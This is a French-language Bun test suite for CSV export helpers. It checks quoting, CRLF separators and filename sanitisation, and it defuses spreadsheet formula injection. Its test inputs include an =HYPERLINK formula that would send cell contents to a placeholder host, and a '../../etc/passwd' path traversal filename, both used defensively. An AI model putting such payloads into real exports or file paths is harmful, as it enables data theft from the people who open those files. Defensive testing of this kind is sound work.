import { describe, expect, test } from "bun:test";
import { BOM_UTF8, champCsv, ligneCsv, nomDeFichierCsv, tableauCsv } from "./csv";

/**
 * ⛔ CE BANC EXISTE POUR DEUX PANNES QUI NE SE VOIENT PAS DANS LE FICHIER GÉNÉRÉ :
 *
 *  1. un séparateur avalé décale toute la ligne — le CSV reste lisible, il est juste FAUX ;
 *  2. un champ qui commence par `=` est exécuté comme une formule par le tableur de celui qui
 *     ouvre l'export. Le contenu vient d'un formulaire d'inscription public : c'est une entrée
 *     d'inconnu qui s'exécute sur le poste d'un collègue.
 */

describe("champCsv — ce qui entre ressort intact", () => {
  test("une valeur ordinaire n'est pas décorée", () => {
    expect(champCsv("Santiago")).toBe("Santiago");
    expect(champCsv(42)).toBe("42");
  });

  test("⛔ la virgule, le guillemet et le saut de ligne sont neutralisés", () => {
    expect(champCsv("Bravo, Sofia")).toBe('"Bravo, Sofia"');
    expect(champCsv('il a dit "oui"')).toBe('"il a dit ""oui"""');
    expect(champCsv("deux\nlignes")).toBe('"deux\nlignes"');
    expect(champCsv("retour\r\nchariot")).toBe('"retour\r\nchariot"');
  });

  test("une espace de bordure est préservée par la citation", () => {
    // Sans citation, le tableur la mange : « Ana » et « Ana » ne se distingueraient plus.
    expect(champCsv(" Ana")).toBe('" Ana"');
    expect(champCsv("Ana ")).toBe('"Ana "');
  });

  test("vide et absent rendent la chaîne vide, jamais le mot « null »", () => {
    expect(champCsv(null)).toBe("");
    expect(champCsv(undefined)).toBe("");
    expect(champCsv("")).toBe("");
  });
});

describe("champCsv — injection de formule (OWASP)", () => {
  test("⛔ les quatre amorces sont désamorcées", () => {
    for (const amorce of ["=", "+", "-", "@"]) {
      expect(champCsv(`${amorce}1+1`)).toBe(`'${amorce}1+1`);
    }
  });

  test("⛔ l'amorce cachée derrière une espace ou une tabulation l'est aussi", () => {
    /*
     * Le tableur saute les blancs de tête avant de décider : ne regarder que le premier caractère
     * laisserait passer exactement la charge qu'un attaquant écrira.
     *
     * ⚠️ L'apostrophe se pose EN TÊTE du champ, pas devant le `=` : c'est le premier caractère du
     * champ que le tableur consulte pour décider « texte » ou « formule ». Ma première version de
     * ce test attendait l'inverse — une attente écrite d'après l'idée que je me faisais du
     * correctif, pas d'après ce que lit le tableur.
     */
    expect(champCsv(" =1+1")).toBe("' =1+1");
    expect(champCsv("\t=1+1")).toBe("'\t=1+1");
  });

  test("⛔ la charge classique reste inerte ET lisible", () => {
    const attaque = '=HYPERLINK("http://exemple.invalid?x="&A1,"cliquez")';
    const rendu = champCsv(attaque);
    // Neutralisée : plus aucun champ ne COMMENCE par `=`…
    expect(rendu.startsWith("=")).toBe(false);
    // …mais rien n'est perdu : la valeur d'origine reste entièrement présente.
    expect(rendu).toContain("HYPERLINK");
    expect(rendu).toContain("cliquez");
  });

  test("un nombre négatif reste écrit, même s'il est cité comme une amorce", () => {
    // `-3` commence par une amorce : on préfère un nombre préfixé à une formule exécutée.
    expect(champCsv(-3)).toBe("'-3");
  });

  test("une amorce AU MILIEU n'est pas touchée : rien n'y est exécutable", () => {
    expect(champCsv("a=b")).toBe("a=b");
    expect(champCsv("2+2=4")).toBe("2+2=4");
  });
});

describe("tableauCsv / ligneCsv", () => {
  test("les lignes sont séparées en CRLF, comme l'exige la RFC 4180", () => {
    const csv = tableauCsv(["a", "b"], [[1, 2], [3, 4]]);
    expect(csv).toBe("a,b\r\n1,2\r\n3,4");
    expect(csv.split("\r\n")).toHaveLength(3);
  });

  test("un tableau sans ligne garde ses en-têtes — un fichier vide se lit comme un échec", () => {
    expect(tableauCsv(["email", "status"], [])).toBe("email,status");
  });

  test("⛔ une valeur à virgule ne décale pas les colonnes suivantes", () => {
    const csv = tableauCsv(["nom", "pays"], [["Bravo, Sofia", "CL"]]);
    // Trois virgules seraient le signe du décalage ; il n'y en a que deux, dont une citée.
    expect(csv).toBe('nom,pays\r\n"Bravo, Sofia",CL');
  });

  test("ligneCsv accepte des types mêlés", () => {
    expect(ligneCsv(["a", 1, null, true])).toBe("a,1,,true");
  });
});

describe("nomDeFichierCsv / BOM", () => {
  test("⛔ aucun séparateur de chemin ne survit au nom de fichier", () => {
    expect(nomDeFichierCsv("../../etc/passwd", "2026-09-18")).toBe("etc-passwd-2026-09-18.csv");
    expect(nomDeFichierCsv('a"b', "2026-09-18")).toBe("a-b-2026-09-18.csv");
  });

  test("un nom vide ou entièrement illisible retombe sur « export »", () => {
    expect(nomDeFichierCsv("", "2026-09-18")).toBe("export-2026-09-18.csv");
    expect(nomDeFichierCsv("///", "2026-09-18")).toBe("export-2026-09-18.csv");
  });

  test("le BOM est un seul caractère — il se sert, il ne se colle pas dans le contenu testé", () => {
    expect(BOM_UTF8).toHaveLength(1);
    expect(BOM_UTF8.charCodeAt(0)).toBe(0xfeff);
  });
});
